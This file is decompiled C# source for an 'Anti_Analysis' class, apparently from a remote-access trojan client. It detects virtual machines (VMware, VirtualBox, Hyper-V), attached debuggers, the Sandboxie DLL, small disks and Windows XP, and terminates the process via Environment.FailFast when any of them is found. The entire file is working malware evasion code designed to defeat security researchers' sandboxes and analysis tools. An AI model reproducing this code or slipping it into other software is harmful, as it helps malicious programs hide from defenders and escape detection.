using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using Microsoft.VisualBasic.Devices;

namespace Client.Helper
{
	// Token: 0x02000006 RID: 6
	internal class Anti_Analysis
	{
		// Token: 0x06000026 RID: 38 RVA: 0x00002F1C File Offset: 0x0000111C
		public static void RunAntiAnalysis()
		{
			if (Anti_Analysis.DetectManufacturer() || Anti_Analysis.DetectDebugger() || Anti_Analysis.DetectSandboxie() || Anti_Analysis.IsSmallDisk() || Anti_Analysis.IsXP())
			{
				Environment.FailFast(null);
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002F58 File Offset: 0x00001158
		private static bool IsSmallDisk()
		{
			try
			{
				long num = 61000000000L;
				if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00002FB0 File Offset: 0x000011B0
		private static bool IsXP()
		{
			try
			{
				if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003000 File Offset: 0x00001200
		private static bool DetectManufacturer()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							string text = managementBaseObject["Manufacturer"].ToString().ToLower();
							if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0600002A RID: 42 RVA: 0x0000313C File Offset: 0x0000133C
		private static bool DetectDebugger()
		{
			bool flag = false;
			bool result;
			try
			{
				NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag);
				result = flag;
			}
			catch
			{
				result = flag;
			}
			return result;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00003180 File Offset: 0x00001380
		private static bool DetectSandboxie()
		{
			bool result;
			try
			{
				if (NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
